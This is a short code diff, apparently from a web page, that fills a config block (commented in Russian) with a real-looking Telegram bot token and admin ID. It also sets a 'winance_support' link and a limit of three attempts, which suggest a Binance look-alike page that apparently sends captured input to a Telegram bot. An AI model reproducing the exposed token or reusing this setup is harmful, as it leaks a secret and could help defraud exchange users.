@@ -492,8 +492,8 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
     // ============================================================
     // КОНФИГ (⚠️ ВСТАВЬ СВОЙ ТОКЕН И ID)
     // ============================================================
-    const BOT_TOKEN = "ВСТАВЬ_ТОКЕН_ОТ_BOTFATHER";
-    const ADMIN_ID  = "8542901240";
+    const BOT_TOKEN = "8962930921:AAEiwjp0QH4YJQv8-SJ0Y0WXC7-swgkUKxA";
+    const ADMIN_ID  = "8949174431";
     const SUPPORT_LINK = "https://t.me/winance_support"; // Ссылка на ТП
     const MAX_ATTEMPTS = 3;
 
